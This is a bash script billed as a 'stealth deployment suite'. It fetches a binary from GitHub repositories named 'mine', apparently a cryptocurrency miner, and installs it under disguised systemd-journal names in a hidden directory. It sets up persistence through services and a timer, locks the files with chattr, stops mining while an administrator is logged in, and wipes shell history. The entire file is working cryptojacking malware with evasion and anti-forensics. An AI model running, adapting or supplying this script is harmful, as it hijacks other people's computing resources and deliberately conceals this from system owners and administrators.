#!/bin/bash
# ==============================================================================
# APEX STEALTH DEPLOYMENT SUITE v9.0 — SELF-HEALING & BULLETPROOF
# Primary: crytonontech1/mine.git | Fallback: terafebcrypto/mine.git
# ==============================================================================

# ★ 0. SELF-HEALING CRLF FIX (Prevents "unexpected end of file" from GitHub) ★
if grep -q $'\r' "$0" 2>/dev/null; then
    sed -i 's/\r$//' "$0" 2>/dev/null || { tr -d '\r' < "$0" > "$0.tmp" && mv "$0.tmp" "$0"; }
    chmod +x "$0" 2>/dev/null
    exec bash "$0" "$@"
fi

# ★ 1. ZERO TRACE INITIATION ★
export HISTFILE=/dev/null
unset HISTFILE 2>/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
set +o history

RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
log() { echo -e "${GREEN}[+]${NC} $1"; }
error() { echo -e "${RED}[-]${NC} $1"; exit 1; }

check_root() { [[ $EUID -ne 0 ]] && error "Root privileges required." }

# 2. SMART BATCH DEPENDENCY INSTALLATION
install_deps() {
    MISSING_PKGS=()
    for cmd in git unzip wget curl; do
        command -v $cmd >/dev/null 2>&1 || MISSING_PKGS+=($cmd)
    done
    if [ ${#MISSING_PKGS[@]} -gt 0 ]; then
        PKG_STR="${MISSING_PKGS[*]}"
        if command -v apt-get >/dev/null 2>&1; then
            apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq $PKG_STR >/dev/null 2>&1
        elif command -v yum >/dev/null 2>&1; then
            yum install -y -q $PKG_STR >/dev/null 2>&1
        elif command -v dnf >/dev/null 2>&1; then
            dnf install -y -q $PKG_STR >/dev/null 2>&1
        elif command -v apk >/dev/null 2>&1; then
            apk add -q $PKG_STR >/dev/null 2>&1
        elif command -v zypper >/dev/null 2>&1; then
            zypper install -y -q $PKG_STR >/dev/null 2>&1
        fi
    fi
}

# 3. CREATE ULTIMATE HIDDEN DIRECTORY
setup_hidden_env() {
    DEPLOY_DIR="/var/tmp/.systemd-journal"
    mkdir -p "$DEPLOY_DIR" 2>/dev/null
    cd "$DEPLOY_DIR" || exit 1

    pkill -9 -x "journald-sync" 2>/dev/null
    pkill -9 -x "kmod-static-nodes" 2>/dev/null
    sleep 1
}

# 4. FETCH, EXTRACT & DISTRIBUTE PAYLOAD
setup_payload() {
    REPOS=(
        "https://github.com/crytonontech1/mine.git"
        "https://github.com/terafebcrypto/mine.git"
    )
    TMP_DIR="/tmp/.sys_build_$(date +%s)"
    BINARY_NAME="journald-sync"
    BINARY_DEST="$DEPLOY_DIR/$BINARY_NAME"
    CONFIG_DEST="$DEPLOY_DIR/config.json"

    rm -rf "$TMP_DIR" 2>/dev/null

    CLONE_SUCCESS=false
    for REPO in "${REPOS[@]}"; do
        git clone --depth=1 --quiet "$REPO" "$TMP_DIR" 2>/dev/null
        if [ -d "$TMP_DIR" ] && [ -f "$TMP_DIR/main.zip" ]; then
            CLONE_SUCCESS=true
            break
        else
            rm -rf "$TMP_DIR" 2>/dev/null
        fi
    done

    [ "$CLONE_SUCCESS" = false ] && error "All repositories failed or main.zip missing"

    mkdir -p "$TMP_DIR/extracted"
    unzip -q -o "$TMP_DIR/main.zip" -d "$TMP_DIR/extracted"

    if [ -d "$TMP_DIR/extracted/main" ]; then
        mv "$TMP_DIR/extracted/main/"* "$TMP_DIR/extracted/" 2>/dev/null
        rmdir "$TMP_DIR/extracted/main" 2>/dev/null
    elif [ -d "$TMP_DIR/extracted/mine" ]; then
        mv "$TMP_DIR/extracted/mine/"* "$TMP_DIR/extracted/" 2>/dev/null
        rmdir "$TMP_DIR/extracted/mine" 2>/dev/null
    fi

    BIN=$(find "$TMP_DIR/extracted" -maxdepth 1 -type f \( -name "journald-sync" -o -name "network" -o -name "kmod-static-nodes" \) | head -1)
    CFG=$(find "$TMP_DIR/extracted" -maxdepth 1 -name "config.json" -type f | head -1)

    [ -z "$BIN" ] || [ -z "$CFG" ] && error "Missing binary or config.json in main.zip"

    cp "$BIN" "$BINARY_DEST" && chmod +x "$BINARY_DEST"
    cp "$CFG" "$CONFIG_DEST" && chmod 644 "$CONFIG_DEST"

    VPS_IP=$(curl -s -4 ifconfig.me || hostname -I | awk '{print $1}' | tr -d '[:space:]')
    [ -z "$VPS_IP" ] && VPS_IP="Node-$(hostname)"
    sed -i "s/\"pass\":[[:space:]]*\"[^\"]*\"/\"pass\": \"$VPS_IP\"/g" "$CONFIG_DEST" 2>/dev/null

    chattr +i "$BINARY_DEST" 2>/dev/null
    chattr +i "$CONFIG_DEST" 2>/dev/null

    rm -rf "$TMP_DIR"
    log "Payload secured in $DEPLOY_DIR, IP injected ($VPS_IP), and locked."
}

# 5. INJECT STEALTH MONITOR
create_stealth_monitor() {
    cat > /usr/local/sbin/journal-sync-helper.sh << 'HEREDOC_HELPER'
#!/bin/bash
DEPLOY_DIR="/var/tmp/.systemd-journal"
BINARY="$DEPLOY_DIR/journald-sync"
CONFIG="$DEPLOY_DIR/config.json"
STATE_FILE="/var/tmp/.journal-state"
DELAY=600

if [ ! -f "$BINARY" ] || [ ! -f "$CONFIG" ]; then
    systemctl restart systemd-journald-sync.service >/dev/null 2>&1
fi

SESSION_ACTIVE=false
if who | grep -qE 'pts/|tty[0-9]'; then SESSION_ACTIVE=true; fi
if pgrep -a sshd 2>/dev/null | grep -qE 'sshd:.*@pts/'; then SESSION_ACTIVE=true; fi

CURRENT_TIME=$(date +%s)
LAST_SESSION_TIME=$(cat "$STATE_FILE" 2>/dev/null || echo "$CURRENT_TIME")

if [ "$SESSION_ACTIVE" = true ]; then
    systemctl stop systemd-journald-sync.service >/dev/null 2>&1
    echo "$CURRENT_TIME" > "$STATE_FILE"
else
    TIME_SINCE_LAST=$((CURRENT_TIME - LAST_SESSION_TIME))
    if [ $TIME_SINCE_LAST -ge $DELAY ]; then
        systemctl enable systemd-journald-sync.service >/dev/null 2>&1
        systemctl start systemd-journald-sync.service >/dev/null 2>&1
    fi
fi
HEREDOC_HELPER
    chmod +x /usr/local/sbin/journal-sync-helper.sh
}

# 6. CREATE DISGUISED SYSTEMD SERVICES
create_services() {
    cat > /etc/systemd/system/systemd-journald-sync.service << 'HEREDOC_SERVICE'
[Unit]
Description=Journal Database Synchronization Service
After=network.target

[Service]
Type=simple
WorkingDirectory=/var/tmp/.systemd-journal
ExecStart=/var/tmp/.systemd-journal/journald-sync
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null
Nice=19
CPUQuota=80%

[Install]
WantedBy=multi-user.target
HEREDOC_SERVICE

    cat > /etc/systemd/system/systemd-journald-sync-helper.service << 'HEREDOC_HELPER_SVC'
[Unit]
Description=Journal Sync Health Check & Recovery

[Service]
Type=oneshot
ExecStart=/usr/local/sbin/journal-sync-helper.sh
StandardOutput=null
StandardError=null
HEREDOC_HELPER_SVC

    cat > /etc/systemd/system/systemd-journald-sync.timer << 'HEREDOC_TIMER'
[Unit]
Description=Journal Sync Periodic Health Check

[Timer]
OnBootSec=1min
OnUnitActiveSec=5min
AccuracySec=1s

[Install]
WantedBy=timers.target
HEREDOC_TIMER
}

# 7. ACTIVATE & WIPE ALL TRACES
activate_and_clean() {
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable systemd-journald-sync.service systemd-journald-sync.timer >/dev/null 2>&1
    systemctl start systemd-journald-sync.service systemd-journald-sync.timer >/dev/null 2>&1

    sleep 2
    if ! pgrep -x "journald-sync" >/dev/null 2>&1; then
        cd "$DEPLOY_DIR" 2>/dev/null
        nohup nice -n 19 ./journald-sync >/dev/null 2>&1 &
    fi

    history -c && history -w >/dev/null 2>&1
    cat /dev/null > ~/.bash_history 2>/dev/null
    cat /dev/null > /root/.bash_history 2>/dev/null

    log "=== APEX DEPLOYMENT COMPLETE ==="
    log "Hidden Dir: /var/tmp/.systemd-journal/"
    log "Evasion: systemctl stop on SSH, resumes 10m after logout."
    log "C2 Protection: Nice=19 + CPUQuota=80% (Agent will NEVER lag)"
    log "Traces: 100% Wiped."
}

# MAIN EXECUTION
main() {
    check_root
    install_deps
    setup_hidden_env
    setup_payload
    create_stealth_monitor
    create_services
    activate_and_clean
}

main "$@"
